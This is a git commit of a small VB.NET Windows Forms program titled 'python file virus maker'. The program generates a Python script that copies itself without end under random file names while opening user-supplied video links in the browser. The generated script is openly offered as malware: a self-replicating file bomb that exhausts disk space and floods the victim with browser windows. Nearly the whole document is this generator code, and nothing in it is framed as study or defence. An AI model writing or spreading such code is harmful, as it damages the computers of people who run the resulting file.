b28bbb04509d0220c7b30bb1194c7b56639e8472
BuildTools <harrycraft11@outlook.com>
2021-08-11 18:25:44 +0100

    Initial commit

---
+++ virus/Form1.Designer.vb
@@ -0,0 +1,122 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.videolink = New System.Windows.Forms.TextBox()
+        Me.comment = New System.Windows.Forms.TextBox()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.ListBox1 = New System.Windows.Forms.ListBox()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.SaveFileDialog1 = New System.Windows.Forms.SaveFileDialog()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(12, 148)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(75, 23)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "add"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'videolink
+        '
+        Me.videolink.Location = New System.Drawing.Point(12, 122)
+        Me.videolink.Name = "videolink"
+        Me.videolink.Size = New System.Drawing.Size(284, 20)
+        Me.videolink.TabIndex = 1
+        '
+        'comment
+        '
+        Me.comment.Location = New System.Drawing.Point(12, 70)
+        Me.comment.Name = "comment"
+        Me.comment.Size = New System.Drawing.Size(284, 20)
+        Me.comment.TabIndex = 2
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(12, 51)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(50, 13)
+        Me.Label1.TabIndex = 3
+        Me.Label1.Text = "comment"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(15, 103)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(52, 13)
+        Me.Label2.TabIndex = 4
+        Me.Label2.Text = "video link"
+        '
+        'ListBox1
+        '
+        Me.ListBox1.FormattingEnabled = True
+        Me.ListBox1.Location = New System.Drawing.Point(329, 12)
+        Me.ListBox1.Name = "ListBox1"
+        Me.ListBox1.Size = New System.Drawing.Size(459, 420)
+        Me.ListBox1.TabIndex = 5
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(18, 409)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(286, 23)
+        Me.Button2.TabIndex = 6
+        Me.Button2.Text = "create"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(800, 450)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.ListBox1)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.comment)
+        Me.Controls.Add(Me.videolink)
+        Me.Controls.Add(Me.Button1)
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.Text = "python file virus maker"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Button1 As Button
+    Friend WithEvents videolink As TextBox
+    Friend WithEvents comment As TextBox
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+    Friend WithEvents ListBox1 As ListBox
+    Friend WithEvents Button2 As Button
+    Friend WithEvents SaveFileDialog1 As SaveFileDialog
+End Class
---
+++ virus/Form1.vb
@@ -0,0 +1,91 @@
+﻿Public Class Form1
+    Dim file As System.IO.StreamWriter
+    Dim list As New List(Of String)
+    Dim tsil As New List(Of String)
+    Dim allcode As New List(Of String)
+    Dim code As String
+
+    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
+
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+
+
+        list.Add(videolink.Text)
+        tsil.Add(comment.Text)
+        ListBox1.Items.Add(videolink.Text + "  :  " + comment.Text)
+    End Sub
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Dim i As Integer = 0
+        For Each item As String In list
+            code = ""
+
+            If i.Equals(0) Then
+                code = "    if Video == 0:
+            site = web.open('[video]')
+            print(site)
+ "
+                code = code.Replace("[video]", item)
+                code = code.Replace("0", i)
+                allcode.Add(code)
+            Else
+                code = "    elif Video == 1:
+            site = web.open('[video]')
+            print(site)"
+                code = code.Replace("[video]", item)
+                code = code.Replace("1", i)
+                allcode.Add(code)
+            End If
+            i += 1
+        Next
+        SaveFileDialog1.Filter = "Python files (*.py)|*.py|All files (*.*)|*.*"
+        SaveFileDialog1.ShowDialog()
+        file = My.Computer.FileSystem.OpenTextFileWriter(SaveFileDialog1.FileName, True)
+        file.WriteLine("import random
+import shutil
+import os 
+import webbrowser as web
+")
+        Dim edoc As String
+        edoc = "    Video = random.randint(0,6)
+    c = 10"
+        file.WriteLine("def MaggieThatch():")
+        file.WriteLine(edoc.Replace("6", list.Count - 1))
+        Dim l As Integer = 0
+        For Each item As String In allcode
+
+            file.WriteLine("#" + tsil(l))
+            file.WriteLine(item)
+            l += 1
+        Next
+        Dim code2 As String
+        Dim code3 As New List(Of String)
+        code2 = "        a = shutil.copy('[filename]','[filename]')"
+        file.WriteLine("def main():
+    while True:
+        a = shutil.copy(__file__, __file__ + 'hello.py')
+        virus = __file__
+        virusNumb = '1' 
+        py = '.py'
+        filename = virus + virusNumb + py
+        shutil.copyfile( __file__ , filename)
+        print(a)
+        
+        while True :
+            virusNumb = str(random.randint(0,100000000000))
+            filename = virus + virusNumb + py
+            a = shutil.copy( __file__,filename)
+            MaggieThatch()
+            print(a)
+")
+        file.WriteLine("main()")
+        file.Close()
+        MessageBox.Show("file done", "virus file - hts ", MessageBoxButtons.OK)
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+    End Sub
+End Class
